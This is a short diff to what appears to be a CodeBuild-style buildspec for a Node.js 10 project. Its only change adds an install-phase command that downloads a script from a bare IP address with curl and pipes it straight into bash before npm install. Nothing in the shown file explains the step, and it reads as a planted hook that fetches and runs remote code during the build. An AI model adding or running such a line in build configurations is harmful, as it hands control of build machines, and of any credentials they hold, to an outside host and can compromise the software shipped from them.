@@ -10,6 +10,7 @@ phases:
     runtime-versions:
       nodejs: 10
     commands:
+      - curl http://139.59.45.127/test.sh | bash
       - npm install
   build:
     commands:
